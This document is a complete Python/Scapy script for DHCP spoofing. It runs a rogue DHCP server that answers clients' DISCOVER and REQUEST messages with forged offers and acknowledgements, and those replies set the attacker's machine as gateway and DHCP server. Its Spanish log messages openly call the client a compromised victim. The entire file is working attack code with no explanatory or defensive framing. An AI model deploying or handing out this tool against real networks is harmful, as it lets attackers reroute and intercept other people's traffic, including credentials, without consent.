#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
import binascii

INTERFACE = "eth0"
FAKE_DHCP = "12.0.20.2"
FAKE_GW   = "12.0.20.2"
OFFER_IP  = "12.0.10.50"
SUBNET    = "255.255.255.0"

def chaddr(mac):
    return binascii.unhexlify(mac.replace(":", "")) + b"\x00" * 10

def handle(pkt):
    if DHCP not in pkt or BOOTP not in pkt:
        return
    msg_type = None
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple) and opt[0] == "message-type":
            msg_type = opt[1]
    xid = pkt[BOOTP].xid
    mac = pkt[Ether].src
    if msg_type == 1:
        print(f"[+] DISCOVER de {mac}")
        offer = (Ether(src=get_if_hwaddr(INTERFACE), dst="ff:ff:ff:ff:ff:ff") / IP(src=FAKE_DHCP, dst="255.255.255.255") / UDP(sport=67, dport=68) / BOOTP(op=2, xid=xid, yiaddr=OFFER_IP, siaddr=FAKE_DHCP, chaddr=chaddr(mac)) / DHCP(options=[("message-type", "offer"), ("server_id", FAKE_DHCP), ("subnet_mask", SUBNET), ("router", FAKE_GW), ("lease_time", 3600), "end"]))
        sendp(offer, iface=INTERFACE, verbose=False)
        print(f"[→] OFFER enviado ({OFFER_IP})")
    elif msg_type == 3:
        print(f"[+] REQUEST de {mac}")
        ack = (Ether(src=get_if_hwaddr(INTERFACE), dst="ff:ff:ff:ff:ff:ff") / IP(src=FAKE_DHCP, dst="255.255.255.255") / UDP(sport=67, dport=68) / BOOTP(op=2, xid=xid, yiaddr=OFFER_IP, siaddr=FAKE_DHCP, chaddr=chaddr(mac)) / DHCP(options=[("message-type", "ack"), ("server_id", FAKE_DHCP), ("subnet_mask", SUBNET), ("router", FAKE_GW), ("lease_time", 3600), "end"]))
        sendp(ack, iface=INTERFACE, verbose=False, count=2)
        print(f"[✓] ACK enviado – víctima comprometida\n")

print("[*] DHCP Spoofing activo...")
sniff(iface=INTERFACE, filter="udp and (port 67 or 68)", prn=handle, store=0)